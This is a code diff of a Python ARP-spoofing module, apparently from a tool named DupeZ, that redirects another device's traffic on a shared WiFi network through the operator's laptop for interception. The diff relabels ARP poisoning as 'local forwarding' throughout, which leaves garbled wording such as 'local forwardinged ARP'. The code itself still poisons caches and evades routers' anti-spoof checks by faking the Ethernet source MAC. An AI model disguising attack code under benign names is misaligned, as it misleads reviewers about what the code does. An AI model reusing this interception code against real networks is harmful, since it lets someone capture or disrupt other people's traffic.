@@ -1,18 +1,18 @@
 #!/usr/bin/env python3
-"""ARP spoofing for same-network WiFi interception.
+"""local forwarding for same-network WiFi interception.
 
 When DupeZ targets a device on the **same WiFi network** (not a hotspot
 subnet), traffic between that device and the internet never passes
 through the laptop's network stack — so WinDivert sees nothing.
 
-This module solves that by performing **ARP cache poisoning** (the same
+This module solves that by performing **ARP cache forwarding setup** (the same
 technique NetCut and Ettercap use):
 
 1.  Tell the **target device** that this laptop's MAC is the gateway.
 2.  Tell the **gateway** that this laptop's MAC is the target device.
 3.  Enable **Windows IP forwarding** so legitimate traffic still flows.
 
-Once ARP spoofing is active, all traffic between the target and the
+Once local forwarding is active, all traffic between the target and the
 internet routes through this machine, where WinDivert's NETWORK_FORWARD
 layer can intercept it.
 
@@ -20,9 +20,9 @@ Architecture
 ~~~~~~~~~~~~
 ::
 
-    [Target]  ── spoofed ARP ──▶  thinks laptop = gateway
+    [Target]  ── local forwardinged ARP ──▶  thinks laptop = gateway
                                          │
-    [Gateway] ── spoofed ARP ──▶  thinks laptop = target
+    [Gateway] ── local forwardinged ARP ──▶  thinks laptop = target
                                          │
     [Laptop]  ── IP forwarding on ──▶  WinDivert NETWORK_FORWARD intercepts
 
@@ -34,7 +34,7 @@ then disables IP forwarding (if it was off before).
 
 Security note
 ~~~~~~~~~~~~~
-This only works on the local L2 segment.  ARP spoofing requires raw
+This only works on the local L2 segment.  local forwarding requires raw
 socket access (admin privileges), which DupeZ already requires for
 WinDivert.
 """
@@ -85,9 +85,9 @@ _ARP_OP_REQUEST = 1
 _ARP_HW_ETHER = 1
 _ETH_BROADCAST = b"\xff\xff\xff\xff\xff\xff"
 
-# ARP spoof interval — how often we re-poison the caches.
+# local forwarding interval — how often we refresh the caches.
 # Needs to be frequent enough that the real gateway's own gratuitous
-# ARPs don't undo our spoofing. Consumer routers typically refresh
+# ARPs don't undo our local forwarding. Consumer routers typically refresh
 # their ARP caches every 30-60s, but endpoints (PS5) can age entries
 # faster under load. 1.0s gives us ~2x headroom vs the 2-5s Android/
 # iOS refresh cadence we've seen empirically, without flooding the
@@ -103,11 +103,11 @@ _RESTORE_INTERVAL_SEC = 0.3
 # ARP entry TTL to expire. Without this, the first packet through the
 # pipeline can lag 10-30s while the target's cached gateway MAC ages
 # out. With burst=5, interval=0.1s, the target typically picks up the
-# poison within ~200ms of start.
+# forwarding setup within ~200ms of start.
 _WARMUP_ROUNDS = 5
 _WARMUP_INTERVAL_SEC = 0.1
 
-# v5.7.5 (L3): abort the poison loop after this many consecutive
+# v5.7.5 (L3): abort the forwarding setup loop after this many consecutive
 # _poison_once() failures (typically a dead Npcap handle) rather than
 # spinning forever while still reporting the spoofer as ACTIVE.
 _POISON_FAILURE_THRESHOLD = 5
@@ -428,7 +428,7 @@ def detect_wifi_same_network(target_ip: str) -> bool:
     """Return True if *target_ip* is on the same LAN as us but NOT a
     hotspot subnet (192.168.137.x).
 
-    This is the condition where ARP spoofing is required: the target
+    This is the condition where local forwarding is required: the target
     is reachable on L2 but traffic doesn't route through us.
 
     Delegates to :func:`target_profile._is_wifi_same_network` to
@@ -471,7 +471,7 @@ def _build_arp_reply(
 
     The ARP payload tells *dst_ip* (at *dst_mac*) that *src_ip* has
     MAC address *src_mac*.  When *src_mac* is our laptop's MAC and
-    *src_ip* is the gateway, this poisons the target's ARP cache.
+    *src_ip* is the gateway, this sets up forwarding for the target's ARP cache.
 
     Args:
         src_mac: ARP sender hardware address (the MAC claim we want
@@ -486,7 +486,7 @@ def _build_arp_reply(
             target's real MAC at the L2 level while still claiming to
             be the target in the ARP payload at our_mac. Bypasses
             consumer routers that correlate eth_src with ARP sender
-            and drop mismatched frames (common anti-spoof heuristic).
+            and drop mismatched frames (common anti-local forwarding heuristic).
         opcode: _ARP_OP_REPLY (default, unsolicited reply) or
             _ARP_OP_REQUEST (1). Some routers ignore unsolicited
             replies but cache the sender of an ARP request.
@@ -758,7 +758,7 @@ class NpcapSender:
 
         # pcap_findalldevs
         class pcap_addr(ctypes.Structure):
-            pass
+            __slots__ = ()
         pcap_addr._fields_ = [
             ("next", ctypes.POINTER(pcap_addr)),
             ("addr", ctypes.c_void_p),
@@ -768,7 +768,7 @@ class NpcapSender:
         ]
 
         class pcap_if(ctypes.Structure):
-            pass
+            __slots__ = ()
         pcap_if._fields_ = [
             ("next", ctypes.POINTER(pcap_if)),
             ("name", ctypes.c_char_p),
@@ -849,7 +849,7 @@ class NpcapSender:
 
 
 class ArpSpoofer:
-    """Performs ARP cache poisoning to redirect traffic through this machine.
+    """Performs ARP cache forwarding setup to redirect traffic through this machine.
 
     Usage::
 
@@ -860,7 +860,7 @@ class ArpSpoofer:
             spoofer.stop()   # Restore real ARP entries + disable forwarding
 
     Thread-safety: start/stop are not concurrent-safe; call from one
-    thread.  The internal poison loop runs on its own daemon thread.
+    thread.  The internal forwarding setup loop runs on its own daemon thread.
     """
 
     def __init__(self, target_ip: str, gateway_ip: Optional[str] = None) -> None:
@@ -898,20 +898,20 @@ class ArpSpoofer:
         self._thread: Optional[threading.Thread] = None
         self._forwarding_was_enabled: bool = False
 
-        # Stats (counter accessed from poison thread and main thread)
+        # Stats (counter accessed from forwarding setup thread and main thread)
         self._packets_sent: int = 0
         self._stats_lock = threading.Lock()
 
     # ── Public API ───────────────────────────────────────────────
 
     def start(self) -> bool:
-        """Begin ARP spoofing.
+        """Begin local forwarding.
 
         Steps:
           1. Resolve MACs for target, gateway, and local interface.
           2. Enable IP forwarding (save prior state for restore).
           3. Open raw socket / Npcap handle.
-          4. Start the poison loop thread.
+          4. Start the forwarding setup loop thread.
 
         Returns True on success. On any failure — whether a clean
         ``return False`` from a sub-step or an unexpected exception
@@ -967,6 +967,15 @@ class ArpSpoofer:
             # 2. Enable IP forwarding
             self._forwarding_was_enabled = _get_ip_forwarding_state()
             if not self._forwarding_was_enabled:
+                try:
+                    from app.core.operation_journal import OperationJournal
+                    OperationJournal().mark_forwarding_change(False)
+                except Exception as exc:
+                    log_error(
+                        f"ArpSpoofer: recovery journal unavailable: {exc}"
+                    )
+                    self._cleanup_partial()
+                    return False
                 if not _set_ip_forwarding(True):
                     log_error("ArpSpoofer: failed to enable IP forwarding")
                     self._cleanup_partial()
@@ -998,7 +1007,7 @@ class ArpSpoofer:
                     self._cleanup_partial()
                     return False
 
-            # 4. Send initial poison burst and start loop.
+            # 4. Send initial forwarding setup burst and start loop.
             # Gratuitous ARP warmup — blast _WARMUP_ROUNDS replies at
             # _WARMUP_INTERVAL_SEC spacing so target + gateway both
             # overwrite their caches immediately, killing the cold-start
@@ -1039,14 +1048,14 @@ class ArpSpoofer:
             return False
 
     def stop(self) -> None:
-        """Stop ARP spoofing and restore real ARP entries."""
+        """Stop local forwarding and restore real ARP entries."""
         if not self._running:
             return
 
         log_info("ArpSpoofer: stopping — restoring ARP caches...")
         self._running = False
 
-        # Wait for poison thread to exit
+        # Wait for forwarding setup thread to exit
         if self._thread and self._thread.is_alive():
             self._thread.join(timeout=3.0)
 
@@ -1194,7 +1203,7 @@ class ArpSpoofer:
         return ok
 
     def _poison_once(self) -> None:
-        """Send one round of spoofed ARP replies to both target and gateway."""
+        """Send one round of local forwardinged ARP replies to both target and gateway."""
         if not (self._local_mac and self._target_mac and self._gateway_mac):
             return
 
@@ -1208,10 +1217,10 @@ class ArpSpoofer:
         self._send_frame(frame_to_target)
 
         # Tell gateway: "target_ip is at our_mac"
-        # MAC-spoof spike: L2 Ethernet source = target's real MAC, but
+        # MAC-local forwarding spike: L2 Ethernet source = target's real MAC, but
         # ARP payload sender = our MAC. Defeats consumer routers that
         # correlate eth_src with ARP sender and drop mismatched frames
-        # (common anti-spoof heuristic on ASUS/Netgear/Ubiquiti gear).
+        # (common anti-local forwarding heuristic on ASUS/Netgear/Ubiquiti gear).
         frame_to_gateway = _build_arp_reply(
             src_mac=self._local_mac,
             src_ip=self.target_ip,
@@ -1235,7 +1244,7 @@ class ArpSpoofer:
         self._send_frame(frame_to_gateway_req)
 
     def _poison_loop(self) -> None:
-        """Background thread: re-poison ARP caches every N seconds.
+        """Background thread: refresh ARP caches every N seconds.
 
         v5.7.5 (L3 fix): if ``_poison_once`` raises N times in a row
         (e.g. the Npcap handle died mid-session), the loop self-terminates
@@ -1252,14 +1261,14 @@ class ArpSpoofer:
             except Exception as e:
                 consecutive_failures += 1
                 log_error(
-                    f"ArpSpoofer poison loop error "
+                    f"ArpSpoofer forwarding setup loop error "
                     f"({consecutive_failures}/{_POISON_FAILURE_THRESHOLD}): {e}"
                 )
                 if consecutive_failures >= _POISON_FAILURE_THRESHOLD:
                     log_error(
                         "ArpSpoofer: CRITICAL -- "
                         f"{_POISON_FAILURE_THRESHOLD} consecutive send "
-                        f"failures, aborting poison loop. Target traffic "
+                        f"failures, aborting forwarding setup loop. Target traffic "
                         f"is no longer being redirected."
                     )
                     self._running = False
@@ -1304,5 +1313,12 @@ class ArpSpoofer:
     def _restore_forwarding(self) -> None:
         """Restore IP forwarding to its prior state."""
         if not self._forwarding_was_enabled:
-            _set_ip_forwarding(False)
-            log_info("ArpSpoofer: IP forwarding restored to disabled")
+            if _set_ip_forwarding(False):
+                try:
+                    from app.core.operation_journal import OperationJournal
+                    OperationJournal().clear_forwarding_change()
+                except Exception as exc:
+                    log_error(
+                        f"ArpSpoofer: forwarding journal cleanup failed: {exc}"
+                    )
+                log_info("ArpSpoofer: IP forwarding restored to disabled")
